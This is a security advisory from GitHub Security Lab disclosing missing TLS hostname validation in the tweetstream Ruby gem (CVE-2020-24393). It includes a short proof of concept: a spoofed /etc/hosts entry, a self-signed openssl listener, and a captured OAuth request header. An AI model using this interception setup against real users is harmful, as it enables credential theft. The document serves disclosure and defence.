<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">September 22, 2020</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-096: Missing hostname validation in tweetstream - CVE-2020-24393</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/agustingianni">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/102623?s=35" height="35" width="35">
        <span>Agustin Gianni</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="summary">Summary</h2>

<p>Missing hostname validation allows an attacker to perform a monster in the middle attack against users of the library.</p>

<h2 id="product">Product</h2>

<p>tweetstream</p>

<h2 id="tested-version">Tested Version</h2>

<p>v2.6.1</p>

<h2 id="details">Details</h2>

<h3 id="missing-ssltls-certificate-hostname-validation">Missing SSL/TLS certificate hostname validation</h3>

<p><a href="https://github.com/tweetstream/tweetstream">tweetstream</a> uses the library <a href="https://github.com/eventmachine/eventmachine">eventmachine</a> in an insecure way that allows an attacker to perform a monster in the middle attack against users of the library.</p>

<h4 id="impact">Impact</h4>

<p>An attacker can assume the identity of a trusted server and introduce malicious data in an otherwise trusted place.</p>

<h4 id="resources">Resources</h4>

<p>To trigger the vulnerability, a simple TLS enabled listening daemon is sufficient as described in the following snippets.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Add a fake DNS entry to /etc/hosts.</span>
<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"127.0.0.1 stream.twitter.com"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts

<span class="c"># Create a certificate.</span>
<span class="nv">$ </span>openssl req <span class="nt">-x509</span> <span class="nt">-newkey</span> rsa:2048 <span class="nt">-keyout</span> key.pem <span class="nt">-out</span> cert.pem <span class="nt">-days</span> 365 <span class="nt">-nodes</span>

<span class="c"># Listen on port 443 with TLS enabled.</span>
<span class="nv">$ </span>openssl s_server <span class="nt">-key</span> key.pem <span class="nt">-cert</span> cert.pem <span class="nt">-accept</span> 443
Using auto DH parameters
Using default temp ECDH parameters
ACCEPT
<span class="nt">-----BEGIN</span> SSL SESSION PARAMETERS-----
MFUCAQECAgMDBALAMAQABDBvBrl+xDDQQtrfCY7Ze0u3b7D760+4j5LJEYeCpnF+
77Ey6JC8jrtq/HGgyz3KjoahBgIEXsJXjaIEAgIcIKQGBAQBAAAA
<span class="nt">-----END</span> SSL SESSION PARAMETERS-----
Shared ciphers:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA256:DHE-RSA-CAMELLIA256-SHA256:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES256-SHA:DHE-RSA-CAMELLIA256-SHA:AES256-GCM-SHA384:AES256-SHA256:CAMELLIA256-SHA256:AES256-SHA:CAMELLIA256-SHA:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-CAMELLIA128-SHA256:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:DHE-RSA-AES128-SHA:DHE-RSA-CAMELLIA128-SHA:AES128-GCM-SHA256:AES128-SHA256:CAMELLIA128-SHA256:AES128-SHA:CAMELLIA128-SHA
CIPHER is ECDHE-RSA-AES256-GCM-SHA384
Secure Renegotiation IS supported
GET /1.1/statuses/sample.json? HTTP/1.1
Host: stream.twitter.com
Accept: <span class="k">*</span>/<span class="k">*</span>
User-Agent: TweetStream Ruby Gem 2.6.1
Authorization: OAuth <span class="nv">oauth_consumer_key</span><span class="o">=</span><span class="s2">"abcdefghijklmnopqrstuvwxyz"</span>, <span class="nv">oauth_nonce</span><span class="o">=</span><span class="s2">"972eb094309bad9a27eba729ad15fd39"</span>, <span class="nv">oauth_signature</span><span class="o">=</span><span class="s2">"LmE4Sgytv6bMWjHm%2B05LX2A7gm4%3D"</span>, <span class="nv">oauth_signature_method</span><span class="o">=</span><span class="s2">"HMAC-SHA1"</span>, <span class="nv">oauth_timestamp</span><span class="o">=</span><span class="s2">"1589794701"</span>, <span class="nv">oauth_token</span><span class="o">=</span><span class="s2">"abcdefghijklmnopqrstuvwxyz"</span>, <span class="nv">oauth_version</span><span class="o">=</span><span class="s2">"1.0"</span>
</code></pre></div></div>

<p>Create a sample client with the following contents:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s1">'tweetstream'</span>

<span class="no">TweetStream</span><span class="p">.</span><span class="nf">configure</span> <span class="k">do</span> <span class="o">|</span><span class="n">config</span><span class="o">|</span>
  <span class="n">config</span><span class="p">.</span><span class="nf">consumer_key</span>       <span class="o">=</span> <span class="s1">'abcdefghijklmnopqrstuvwxyz'</span>
  <span class="n">config</span><span class="p">.</span><span class="nf">consumer_secret</span>    <span class="o">=</span> <span class="s1">'0123456789'</span>
  <span class="n">config</span><span class="p">.</span><span class="nf">oauth_token</span>        <span class="o">=</span> <span class="s1">'abcdefghijklmnopqrstuvwxyz'</span>
  <span class="n">config</span><span class="p">.</span><span class="nf">oauth_token_secret</span> <span class="o">=</span> <span class="s1">'0123456789'</span>
  <span class="n">config</span><span class="p">.</span><span class="nf">auth_method</span>        <span class="o">=</span> <span class="ss">:oauth</span>
<span class="k">end</span>

<span class="no">TweetStream</span><span class="o">::</span><span class="no">Client</span><span class="p">.</span><span class="nf">new</span><span class="p">.</span><span class="nf">sample</span> <span class="k">do</span> <span class="o">|</span><span class="n">status</span><span class="o">|</span>
  <span class="nb">puts</span> <span class="s2">"</span><span class="si">#{</span><span class="n">status</span><span class="p">.</span><span class="nf">text</span><span class="si">}</span><span class="s2">"</span>
<span class="k">end</span>
</code></pre></div></div>

<p>Run the example client to see a connection being performed in the listening daemon initialized in the previous steps.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ruby tweetstream.rb
</code></pre></div></div>

<h4 id="references">References</h4>

<p><a href="https://cwe.mitre.org/data/definitions/297.html">CWE-297: Improper Validation of Certificate with Host Mismatch</a></p>

<h2 id="cve">CVE</h2>
<p>CVE-2020-24393</p>

<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>18/05/2020: Report sent to Vendor</li>
  <li>24/08/2020: Coordinated disclosure deadline expired, no maintainer response</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/agustingianni">@agustingianni (Agustin Gianni)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include the <code class="language-plaintext highlighter-rouge">GHSL-2020-096</code> in any communication regarding this issue.</p>

    